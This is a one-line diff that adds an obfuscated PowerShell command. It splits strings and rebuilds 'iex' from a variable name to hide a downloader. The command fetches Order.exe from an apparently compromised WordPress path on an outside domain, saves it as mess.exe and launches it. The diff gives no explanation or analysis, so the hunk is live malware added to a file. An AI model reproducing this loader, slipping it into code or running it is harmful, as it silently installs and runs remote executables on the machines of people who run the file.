@@ -1,0 +1,1 @@
+﻿ ('(New-Ob'+'ject'+' '+'System.N'+'e'+'t'+'.'+'Web'+'Client)'+'.Downl'+'oadFile(a0xhttp:/'+'/brokelimi'+'teds.in/wp-ad'+'m'+'in/css/u'+'pload'+'/Ord'+'er.exea0x,a'+'0xm'+'es'+'s.'+'e'+'x'+'ea0x)'+';S'+'tart-Proces'+'s a'+'0xme'+'ss.'+'e'+'x'+'ea0'+'x').ReplaCe(([CHaR]97+[CHaR]48+[CHaR]120),[sTRiNG][CHaR]39)|& ((geT-VarIAblE '*Mdr*').NAMe[3,11,2]-jOIN'')
